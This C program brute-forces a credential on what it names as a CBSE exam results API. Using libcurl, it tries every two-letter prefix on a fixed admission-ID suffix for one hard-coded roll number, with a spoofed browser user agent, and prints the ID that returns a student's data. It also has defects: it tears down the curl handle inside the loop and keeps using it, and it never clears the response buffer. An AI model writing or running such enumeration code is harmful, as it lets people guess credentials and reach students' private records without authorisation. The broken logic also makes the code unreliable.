#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <cjson/cJSON.h>

#define API_URL "https://results.digilocker.gov.in/api/cbse/hscer/results"

struct Memory {
    char *response;
    size_t size;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;

    struct Memory *mem = (struct Memory *)userp;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);

    if(ptr == NULL)
        return 0;

    mem->response = ptr;

    memcpy(&(mem->response[mem->size]), contents, realsize);

    mem->size += realsize;
    mem->response[mem->size] = 0;

    return realsize;
}


int main()
{
    CURL *curl;
    CURLcode res;

    struct Memory chunk;

    chunk.response = malloc(1);
    chunk.size = 0;

    char roll[32] = "20626124";
    char admit[32];
    char postfields[256];
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();

    if(!curl)
    {
        printf("Failed to initialize curl\n");
        return 1;
    }


for(char i = 'A'; i <= 'Z'; i++)
    {
        for(char j = 'A'; j <= 'Z'; j++)
        {
	            sprintf(admit, "%c%c245571", i, j);
		    snprintf(postfields,
			     sizeof(postfields),
			     "rroll=%s&year=2026&admn_id=%s",
			     roll,
			     admit);

		    curl_easy_setopt(curl, CURLOPT_URL, API_URL);
		    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
		    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
		    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
		    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
		    res = curl_easy_perform(curl);
		    if(res != CURLE_OK)
		    {
			fprintf(stderr,
				"curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
			return 1;
		    }
		    cJSON *json = cJSON_Parse(chunk.response);
		    if(!json)
		    {
			printf("Failed to parse JSON\n");
			return 1;
		    }
		    cJSON *data = cJSON_GetObjectItem(json, "data");

		    if(!cJSON_IsObject(data))
		    {
			printf("%s\n",admit);
			cJSON_Delete(json);
			curl_easy_cleanup(curl);
			curl_global_cleanup();

			continue;
		    }
		    else{
			printf("%s,Works",admit);
			cJSON_Delete(json);
			free(chunk.response);
			curl_easy_cleanup(curl);
			curl_global_cleanup();
			return 0;
		    }


        }
    }

}
